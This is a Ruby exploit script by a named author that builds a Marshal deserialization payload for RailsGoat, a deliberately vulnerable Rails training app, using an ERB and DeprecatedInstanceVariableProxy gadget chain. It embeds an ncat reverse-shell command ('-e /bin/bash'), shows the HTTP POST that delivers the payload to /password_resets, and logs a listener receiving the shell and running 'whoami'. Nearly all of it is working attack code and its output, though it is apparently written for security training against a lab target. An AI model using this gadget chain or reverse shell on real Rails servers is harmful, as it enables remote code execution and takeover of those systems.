# RoR + ERB Exploit Payload for RailsGoat
# @author LongCat (Pichaya Morimoto)
# Tested on ruby 2.3.5 + rails 5.1.4
require "base64"
require "erb"
class ActiveSupport
  class Deprecation
    class DeprecatedInstanceVariableProxy
      def initialize(instance, method)
        @instance = instance
        @method = method
        @deprecator = ActiveSupport::Deprecation
      end
    end
  end
end
code = '`ncat 127.0.0.1 1234 -v -e /bin/bash 2>&1`'
erb = ERB.allocate
erb.instance_variable_set :@src, code
erb.instance_variable_set :@filename, "1"
erb.instance_variable_set :@lineno, 1

ggez = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result
puts Base64.encode64(Marshal.dump(ggez)).gsub("\n", "")
# POST /password_resets HTTP/1.1
# Host: localhost:3000
# Accept: text/html, application/xhtml+xml
# Turbolinks-Referrer: http://localhost:3000/
# User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
# Referer: http://localhost:3000/
# Accept-Encoding: gzip, deflate
# Accept-Language: en-US,en;q=0.9
# Cookie: _railsgoat_session=Y3lJOGJsQ1RSbVBzNXhnYVJnVmYwY3JiZ3RsOVNJWS9pVWtZbHpqZGMyYWNLQXc0M21ha3B5TlMzeW5UWCtCYzdOblpkZ29yMzdJUGRKaHJIZERFNVB6L3o1QkRiMHczTXd1WE44Y0o3WHp0cVdnbWRhNEt0WEprM1QweEtMRUgzaUV3TWdXNFRpZFVsMnA1L1QvazhTOEVyWjBoR3FTbWZQSFJ4em5BQUdjeUdxNGptUy9BbzYrc0IvSm9GQTMwLS1SN3h4SmxYZlZ3M1Y0UzFUaU1jMXB3PT0%3D--43d95cfe8a06f81a00323dac4bb3d810a8667d9b
# Connection: close
# Content-Type: application/x-www-form-urlencoded
# Content-Length: 351
# user=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQg6DkBpbnN0YW5jZW86CEVSQgg6CUBzcmNJIi9gbmNhdCAxMjcuMC4wLjEgMTIzNCAtdiAtZSAvYmluL2Jhc2ggMj4mMWAGOgZFVDoOQGZpbGVuYW1lSSIGMQY7CVQ6DEBsaW5lbm9pBjoMQG1ldGhvZDoLcmVzdWx0OhBAZGVwcmVjYXRvcm86GEJ1bmRsZXI6OlVJOjpTaWxlbnQGOg5Ad2FybmluZ3NbAA==&password=x&confirm_password=x
# $ ncat -lvp 1234 -k
# Ncat: Version 7.60 ( https://nmap.org/ncat )
# Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
# Ncat: SHA-1 fingerprint: A56B D904 2E26 A379 0F99 4C10 515E 5B89 B6D1 54A0
# Ncat: Listening on :::1234
# Ncat: Listening on 0.0.0.0:1234
# Ncat: Connection from 127.0.0.1.
# Ncat: Connection from 127.0.0.1:53924.
# whoami
# pichaya
